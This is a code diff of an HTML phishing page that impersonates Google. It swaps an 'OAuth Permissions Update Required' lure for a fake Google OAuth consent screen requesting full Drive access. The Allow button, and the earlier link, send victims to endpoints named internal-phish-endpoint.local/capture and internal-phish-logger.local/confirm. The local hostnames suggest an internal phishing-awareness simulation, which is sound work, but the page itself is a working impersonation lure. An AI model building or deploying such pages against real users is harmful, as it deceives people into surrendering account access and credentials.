@@ -2,78 +2,172 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <title>Google OAuth 2.0 Playground</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Google OAuth Permissions Update</title>
   <style>
     body {
-      background-color: #f2f2f2;
       font-family: Roboto, Arial, sans-serif;
-      color: #202124;
+      background-color: #f5f5f5;
       margin: 0;
-      padding: 0;
+      padding: 20px;
     }
-    .container {
-      max-width: 480px;
+
+    .card {
+      max-width: 420px;
+      margin: 40px auto;
       background: #fff;
-      margin: 60px auto;
-      padding: 40px;
+      border: 1px solid #dadce0;
       border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 30px 24px;
+      box-shadow: 0px 1px 2px rgba(0,0,0,0.1);
     }
-    .logo {
-      display: block;
-      margin: 0 auto 24px;
-      width: 92px;
-    }
-    h1 {
-      font-size: 20px;
-      margin-bottom: 16px;
-      text-align: center;
-    }
-    p {
+
+    .header {
+      display: flex;
+      align-items: center;
       font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      height: 20px;
+      margin-right: 8px;
+    }
+
+    h2 {
+      font-size: 18px;
+      color: #1a73e8;
+      margin: 0 0 6px;
+    }
+
+    .user-email {
+      display: flex;
+      align-items: center;
+      margin: 12px 0 16px;
+      font-size: 14px;
+      color: #202124;
+    }
+
+    .user-email img {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #d9d9d9;
+      margin-right: 8px;
+    }
+
+    .scope {
+      display: flex;
+      align-items: flex-start;
+      font-size: 14px;
+      margin: 16px 0;
+    }
+
+    .scope img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+      margin-top: 2px;
+    }
+
+    .scope-info {
+      line-height: 1.4;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 20px;
       line-height: 1.5;
-      margin-bottom: 24px;
-      text-align: center;
     }
-    .button {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      font-size: 14px;
-      font-weight: bold;
-      text-align: center;
-      background-color: #1a73e8;
-      color: #fff;
+
+    .link {
+      color: #1a73e8;
       text-decoration: none;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 24px;
+    }
+
+    .btn {
+      padding: 8px 20px;
+      font-size: 14px;
       border-radius: 4px;
-      transition: background-color 0.3s;
+      cursor: pointer;
+      font-weight: 500;
+      border: none;
     }
-    .button:hover {
-      background-color: #155ab6;
+
+    .cancel {
+      background: none;
+      color: #1a73e8;
     }
+
+    .allow {
+      background: #1a73e8;
+      color: white;
+    }
+
     .footer {
-      font-size: 11px;
-      color: #777;
       text-align: center;
-      margin-top: 32px;
+      font-size: 11px;
+      color: #999;
+      margin-top: 40px;
     }
+
+    .footer a {
+      color: #666;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo"/>
-    <h1>OAuth Permissions Update Required</h1>
-    <p>
-      To comply with updated security requirements, all users must re-authorize their connected applications.
-    </p>
-    <p>
-      This ensures that your Google Workspace account and linked apps maintain secure access under the new policy.
-    </p>
-    <a href="https://internal-phish-logger.local/confirm" class="button">Review & Re-Authorize</a>
-    <div class="footer">
-      Google LLC · 1600 Amphitheatre Parkway · Mountain View, CA 94043
+
+  <div class="card">
+    <div class="header">
+      <img src="https://ssl.gstatic.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google G" />
+      <span>Sign in with Google</span>
+    </div>
+
+    <h2>Google OAuth 2.0 Playground</h2>
+    <p>wants to access your Google Account</p>
+
+    <div class="user-email">
+      <img src="https://www.gstatic.com/images/icons/material/system/1x/account_circle_grey600_24dp.png" alt="User Icon" />
+      <span>user@domain.com</span>
+    </div>
+
+    <p>This will allow <strong>Google OAuth 2.0 Playground</strong> to:</p>
+
+    <div class="scope">
+      <img src="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" alt="Drive Icon" />
+      <div class="scope-info">
+        See, edit, create and delete all of your Google Drive files
+      </div>
+    </div>
+
+    <div class="note">
+      Make sure that you trust Google OAuth 2.0 Playground. You may be sharing sensitive info with this site or app. Find out how it handles your data by reviewing its terms of service and privacy policies. You can always see or remove access in your <a href="#" class="link">Google account</a>.<br><br>
+      <a href="#" class="link">Find out about the risks</a>
+    </div>
+
+    <div class="actions">
+      <button class="btn cancel">Cancel</button>
+      <button class="btn allow" onclick="window.location.href='https://internal-phish-endpoint.local/capture'">Allow</button>
     </div>
   </div>
+
+  <div class="footer">
+    <span>English (United States)</span>
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+
 </body>
 </html>
